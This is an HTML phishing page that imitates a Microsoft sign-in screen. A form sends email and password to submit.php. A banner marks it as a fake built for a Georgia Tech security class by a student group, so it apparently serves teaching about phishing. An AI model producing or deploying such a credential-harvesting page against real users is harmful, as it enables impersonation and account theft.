<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        @keyframes flash {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f2f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }

        .banner {
            background-color: red;
            color: white;
            font-weight: bold;
            font-size: 20px;
            padding: 10px;
            text-align: center;
            width: 100%;
            animation: flash 5s infinite;
        }

        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            margin-top: 20px;
        }

        .login-container img {
            display: block;
            margin: 0 auto 20px auto;
            max-width: 100px;
        }

        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
            color: #333;
        }

        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }

        .login-container input[type="submit"] {
            background-color: #0078d4;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }

        .login-container input[type="submit"]:hover {
            background-color: #005a9e;
        }

        .login-container a {
            color: #0078d4;
            text-decoration: none;
            font-size: 14px;
            display: block;
            text-align: center;
            margin-top: 20px;
        }

        .login-container a:hover {
            text-decoration: underline;
        }

        .login-container .forgot-password {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="banner">
        --ATTENTION-- THIS IS A FAKE CREDENTIAL PHISHING LOGIN. THIS PAGE WAS BUILT FOR GaTech's PUBP 6727 CLASS & WAS BUILT BY GROUP 9: CLARENCE VALELO, AMR ELADAWY, KEVIN GONZALEZ, & LIN HAN. --ATTENTION--
    </div>
    <div class="login-container">
        <img src="https://logodix.com/logo/1060396.png" alt="Microsoft Logo">
        <h1>Sign in</h1>
        <form action="submit.php" method="POST">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" value="Sign in">
        </form>
        <a href="#" class="forgot-password">Can't access your account?</a>
    </div>
</body>
